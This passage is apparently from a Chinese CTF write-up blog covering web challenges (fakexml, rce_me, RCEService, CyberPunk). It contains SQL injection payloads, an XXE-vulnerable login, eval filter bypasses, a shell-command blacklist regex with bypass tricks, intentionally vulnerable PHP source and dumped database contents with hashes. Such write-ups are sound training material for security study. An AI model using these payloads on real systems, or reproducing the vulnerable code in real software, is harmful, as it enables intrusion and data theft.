(我吐了爆破半天没出来还是谷歌的,谁知道后面是全数字)</p><p>代码审计发现经典的二次注入啊</p><p>因为没有报错所以不知道自己的语句是否正确就调了很久</p><p>令<code>catagory=&#39;\\&#39;</code>,</p><pre><code>content=%2Ccontent%3D0x6464646464%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23content=%2Ccontent%3D(SELECT+group_concat(schema_name)+FROM+information_schema.schemata)%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23</code></pre><p>去把数据库dump下来后发现没啥东西</p><p>接着去试试读取文件</p><p>发现可以读取文件</p><p>读取/etc/passwd得到</p><pre><code>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:syslog:x:101:104::/home/syslog:/bin/falsemysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/falsewww:x:500:500:www:/home/www:/bin/bash</code></pre><p>发现只有一个可以登陆的用户:<code>www</code></p><p>查看他的<code>.bash_history</code></p><pre><code class="shell">cd /tmp/unzip html.ziprm -f html.zipcp -r html /var/www/cd /var/www/html/rm -f .DS_Storeservice apache2 start</code></pre><p>发现他要删除<code>.DS_Store</code>防止我们知道目录结构,但是<code>/tmp</code>目录是没有这个文件的,也就是所<code>/tmp/www</code>下有<code>.DS_Store</code>文件,拿到文件解析后得到flag文件名</p><pre><code>bootstrapcomment.phpcssflag_8946e1ff1ee3e40f.phpfontsindex.phpjslogin.phpmysql.phpvendorwrite_do.php</code></pre><h2 id="fakexml"><a href="#fakexml" class="headerlink" title="fakexml"></a>fakexml</h2><p>存在xxe</p><pre><code class="php">&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &#39;admin&#39;; //$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try{    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD){        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    }else{        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    }    }catch(Exception $e){    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());}header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p>直接读取/flag得到flag:<code>flag{663e8e72-be03-4533-a4cd-c44452942287}</code></p><h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;])){            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40){                                        die(&quot;This is too Long.&quot;);                                                }                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){                                        die(&quot;NO.&quot;);                                                }                    @eval($code);}else{            highlight_file(__FILE__);}// ?&gt;</code></pre><p>代码很简单,但是限制有点麻烦,我们利用<code>~</code>来绕过不允许字母和数字的限制</p><blockquote><p> 因为是一个语言构造器而不是一个函数，不能被 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/functions.variable-functions.html">可变函数</a> 调用。 </p></blockquote><p>所以不能直接<code>(~&quot;eval的~&quot;)(&quot;xxxxx&quot;)</code>,都没总结这些命令,导致我过了很久才想起assert</p><p>disable_function:</p><pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>要读取flag必须命令执行,但是根据phpinfo,他禁用了system,exec等等用<code>https://github.com/mm0r1</code>这个大佬的脚本来绕过</p><p><code>flag{c7e5be35-729b-4bd0-aacd-c7a1eb98ddea}</code></p><h2 id="RCEService"><a href="#RCEService" class="headerlink" title="RCEService"></a>RCEService</h2><p>允许的字符:<code>,:,a-z,{,}</code></p><p>黑名单:<code>pwd,echo</code></p><p>刚开始以为是假的命令执行,看到报错后发现这是真的</p><pre><code class="php">Warning&lt;/b&gt;:  system() expects parameter 1 to be string, array given in &lt;b&gt;/var/www/html/index.php</code></pre><p>那先想办法读取index.php,测试后发现是用<code>$_REQUEST</code>来接受数据</p><p>后来实在没想法就去百度了,看到的wp都是清一色的直接给源码?????您们源码哪来的</p><pre><code class="php">&lt;?phpputenv(&#39;PATH=/home/rceservice/jail&#39;);if (isset($_REQUEST[&#39;cmd&#39;])) {  $json = $_REQUEST[&#39;cmd&#39;];  if (!is_string($json)) {    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;  } elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;  } else {    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;    $cmd = json_decode($json, true)[&#39;cmd&#39;];    if ($cmd !== NULL) {      system($cmd);    } else {      echo &#39;Invalid input&#39;;    }    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;  }}?&gt;</code></pre><p>用换行来绕过preg_match或者输入足够长的字符来绕过preg的回溯次数</p><h2 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h2><pre><code class="php">&lt;?phpini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);if (isset($file)){    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {        echo(&#39;no way!&#39;);        exit;    }    @include($file);}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;index&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h2&gt;2077发售了,不来份实体典藏版吗?&lt;/h2&gt;        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;h3&gt;提交订单&lt;/h3&gt;                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;                    &lt;p&gt;                    &lt;h3&gt;姓名:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;                    &lt;h3&gt;电话:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;                    &lt;h3&gt;地址:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;                    &lt;/p&gt;                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;我正是送钱之人&lt;/button&gt;                &lt;/form&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;            &lt;a href=&quot;./search.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./change.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./delete.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;            &lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--?file=?--&gt;</code></pre><p>search.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);#日穿    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        if(!$row) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;    } else {        $msg = &quot;未找到订单!&quot;;    }}else {    $msg = &quot;信息不全&quot;;}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;搜索&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;                &lt;h1&gt;订单查询&lt;/h1&gt;                &lt;form method=&quot;post&quot;&gt;                    &lt;p&gt;                    &lt;h3&gt;姓名:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;                    &lt;h3&gt;电话:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;                    &lt;/p&gt;                    &lt;p&gt;                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;查询订单&lt;/button&gt;                    &lt;/p&gt;                &lt;/form&gt;                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;            &lt;a href=&quot;./index.php&quot;&gt;                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./change.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;            &lt;/a&gt;             &lt;a href=&quot;./delete.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;            &lt;/a&gt;            &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>change.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $address = addslashes($_POST[&quot;address&quot;]);    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){        $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];        $result = $db-&gt;query($sql);        if(!$result) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;订单修改成功&quot;;    } else {        $msg = &quot;未找到订单!&quot;;    }}else {    $msg = &quot;信息不全&quot;;}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;修改收货地址&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;                &lt;h1&gt;修改收货地址&lt;/h1&gt;                &lt;form method=&quot;post&quot;&gt;                    &lt;p&gt;                    &lt;h3&gt;姓名:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;                    &lt;h3&gt;电话:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;                    &lt;h3&gt;地址:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;                    &lt;/p&gt;                    &lt;p&gt;                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;修改订单&lt;/button&gt;                    &lt;/p&gt;                &lt;/form&gt;                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;            &lt;a href=&quot;./index.php&quot;&gt;                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./search.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./delete.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;            &lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>delete.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);        if(!$result) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;订单删除成功&quot;;    } else {        $msg = &quot;未找到订单!&quot;;    }}else {    $msg = &quot;信息不全&quot;;}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;删除订单&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;                &lt;h1&gt;删除订单&lt;/h1&gt;                &lt;form method=&quot;post&quot;&gt;                    &lt;p&gt;                    &lt;h3&gt;姓名:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;                    &lt;h3&gt;电话:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;                    &lt;/p&gt;                    &lt;p&gt;                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;删除订单&lt;/button&gt;                    &lt;/p&gt;                &lt;/form&gt;                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;            &lt;a href=&quot;./index.php&quot;&gt;                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./search.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./change.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;            &lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>confirm.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $address = $_POST[&quot;address&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){        $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if($fetch-&gt;num_rows&gt;0) {        $msg = $user_name.&quot;已提交订单&quot;;    }else{        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;        $re = $db-&gt;prepare($sql);        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);        $re = $re-&gt;execute();        if(!$re) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;订单提交成功&quot;;    }} else {    $msg = &quot;信息不全&quot;;}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;确认订单&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;meta charset=&quot;utf-8&quot;/&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;                &lt;a href=&quot;./index.php&quot;&gt;                &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39;&gt;返回&lt;/button&gt;                &lt;/a&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;            &lt;a href=&quot;./search.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./change.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./delete.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;            &lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>阅读代码发现,search处有sql注入,但是有以下限制:<code>&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;</code></p><p>change处有明显的二次注入,无限制,但是是update</p><pre><code>&quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];</code></pre><p>我们利用报错注入来获取回显</p><pre><code>information_schema,test,performance_schema,ctftraining,mysql,ctfusersctftraining:FLAG_TABLE,news,usersFLAG_TABLE:FLAG_COLUMNusers:id,username,password,ip,timenews:id,title,content,timectfusers:useruser:user_id,address,old_address,user_name,phone</code></pre><pre><code>1dogThe domestic dog (Canis lupus familiaris when considered a subspecies of the wolf or Canis familiaris when considered a distinct species)[4] is a member of the genus Canis (canines), which forms part of the wolf-like canids,[5] and is the most widely abundant terrestrial carnivore.1571838684,2catThe cat or domestic cat (Felis catus) is a small carnivorous mammal.[1][2] It is the only domesticated species in the family Felidae.[4] The cat is either a house cat, kept as a pet, or a feral cat, freely ranging and avoiding human contact.1571838684,3birdBirds, also known as Aves, are a group of endothermic vertebrates, characterised by feathers, toothless beaked jaws, the laying of hard-shelled eggs, a high metabolic rate, a four-chambered heart, and a strong yet lightweight skeleton.1571838684,4flagFlag is in the database but not here.15718386841,admin,21232f297a57a5a743894a0e4a801fc3,127.0.0.1,1571838684,2,guest,084e0343a0486ff05530df6c705c8bb4,127.0.0.1,1571838684,3,virink,a4346e75cc1dd161a8d57f3b2d5d82d0,127.0.0.1,1571838684  